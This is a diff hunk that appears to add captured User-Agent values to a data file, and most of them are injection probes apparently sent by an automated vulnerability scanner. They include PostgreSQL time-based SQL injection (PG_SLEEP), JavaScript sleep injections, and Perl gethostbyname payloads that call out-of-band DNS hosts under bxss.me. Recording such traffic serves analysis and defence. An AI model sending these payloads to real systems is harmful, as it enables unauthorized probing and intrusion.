@@ -3566,3 +3566,8 @@ geth(ostbyname(lc('hitqd'.'pogjdkjob9ce3.bxss.me.')).'A'.chr(67).chr(hex('58')).
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.366z9CNsBk' OR 566=(SELECT 566 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36qqVULjRE')) OR 650=(SELECT 650 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36ieu3GJSj') OR 302=(SELECT 302 FROM PG_SLEEP(15))--)
+geth(ostbyname(lc('hityr'.'ikkijbaq72be3.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(121).chr(80).chr(105).chr(78))
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'||sleep(27*1000)*mhbjui||')
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'&&sleep(27*1000)*pvvbzk&&')
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36""||sleep(27*1000)*zeztoh||"")
+"".gethostbyname(lc(""hitie"".""ahhpsgim20479.bxss.me."").""A"".chr(67).chr(hex(""58"")).chr(117).chr(78).chr(116).chr(81)."")
